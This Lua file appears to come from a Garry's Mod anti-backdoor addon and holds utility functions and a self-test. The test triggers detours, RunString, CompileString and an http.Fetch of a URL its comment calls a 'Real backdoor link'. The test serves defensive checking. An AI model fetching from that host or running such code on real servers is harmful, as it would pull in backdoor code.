--[[
    ©2020 Xalalau Xubilozo. All Rights Reserved.
    https://tldrlegal.com/license/all-rights-served#summary
    https://xalalau.com/
--]]

function BS:Utils_GetRandomName()
    local name = string.ToTable("qwertyuiopsdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM")
	local newName = ""
	local aux, rand
    
	for i = 1, #name do
		rand = math.random(#name)
		aux = name[i]
		name[i] = name[rand]
		name[rand] = aux
    end

    for i = 1, #name do
        newName = newName .. name[i]
    end

    return newName
end

function BS:Utils_GetFilesCreationTimes()
    local times = {}

    local function parseDir(dir)
        local files, dirs = file.Find(dir .. "*", "LUA")
    
        if not dirs then
            return
        end
    
        for _, fdir in pairs(dirs) do
            parseDir(dir .. fdir .. "/")
        end
    
        for k,v in pairs(files) do
            times[dir .. v] =  file.Time(dir .. v, "LUA")
        end 
    end

    parseDir(self.FOLDER.LUA)

    return times
end

function BS:Utils_RunTests()
    print("\n\n---------------------------------------------------------\n[START]\n")

    local bak = self.__G["http"]["Post"]
    print("\n-----> Detouring")
    local function detour() return bak() end
    self.__G["http"]["Post"] = detour
    detour()

    print("\n-----> getfenv")
    self.__G.getfenv()

    print("\n-----> debug.getfenv")
    local function this() end
    self.__G.debug.getfenv(this)

    print("\n-----> http.fetch\n\n(will appear later)")
    self.__G.http.Fetch("http://disp0.cf/gas.lua", function (arg) -- Real backdoor link
        print("in http.fetch")
    end)

    print("\n\n-----> RunString")
    self.__G.RunString("RunString(print('WELCOME ******'))", "bla");

    print("\n-----> RunStringEx")
    self.__G.RunStringEx("RunString(print('WELCOME ******'))", "bla");

    print("\n-----> debug.getinfo to check detouring\n")
    if self.__G.debug.getinfo(self.__G.http.Post).short_src == "lua/includes/modules/http.lua" then
        print("I guess http.Post is valid")
    end

    print("\n\n-----> jit.util.funcinfo to check detouring\n")
    if self.__G.jit.util.funcinfo(self.__G.debug.getinfo)["source"] == nil then
        print("I guess debug.getinfo is valid")
    end

    print("\n\n-----> debug.getinfo of RunString\n")
    PrintTable(self.__G.debug.getinfo(self.__G.RunString, "flnSu"))

    print("\n\n-----> jit.util.funcinfo of debug.getinfo\n")
    PrintTable(self.__G.jit.util.funcinfo(self.__G.debug.getinfo))

    print("\n\n-----> CompileFile")
    local compFile = self.__G.CompileFile("bs/server/modules/utils.lua")

    print("\n-----> CompileString")
    local compStr = self.__G.CompileString("RunString(MsgN('Hi))", "TestCode")

    print("\n[END]\n---------------------------------------------------------\n(http.Fetch test pending)\n")
end
